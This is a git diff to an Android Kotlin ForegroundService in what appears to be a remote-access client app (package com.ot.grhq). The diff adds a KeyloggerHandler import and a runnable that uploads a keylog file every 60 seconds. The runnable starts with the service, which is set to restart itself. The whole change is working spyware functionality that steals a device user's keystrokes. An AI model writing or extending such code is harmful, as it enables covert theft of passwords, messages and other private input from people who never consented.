@@ -15,6 +15,7 @@ import android.os.Looper
 import android.util.Log
 import androidx.annotation.RequiresApi
 import androidx.core.app.NotificationCompat
+import com.ot.grhq.client.functionality.KeyloggerHandler
 import com.ot.grhq.client.functionality.Utils
 import org.json.JSONObject
 import java.net.URI
@@ -28,7 +29,15 @@ class ForegroundService : Service() {
     var isConnected = false
     private val SERVICE_RESTART_INTENT = "com.ot.grhq.receiver.restartservice"
     private val handler = Handler(Looper.getMainLooper())
+    private val keyloggerHandler = Handler(Looper.getMainLooper())
     private val interval: Long =  5000
+    private val keyloggerInterval: Long =  60000
+    private val keylogTask = object: Runnable {
+        override fun run() {
+            KeyloggerHandler.getInstance().uploadFile(applicationContext)
+            keyloggerHandler.postDelayed(this, keyloggerInterval)
+        }
+    }
     private val task = object: Runnable {
         override fun run() {
             try {
@@ -79,6 +88,7 @@ class ForegroundService : Service() {
                 .setSmallIcon(R.mipmap.ic_launcher).build()
         startForeground(1, notification)
         handler.post(task)
+        keyloggerHandler.post(keylogTask)
         return START_STICKY
     }
 
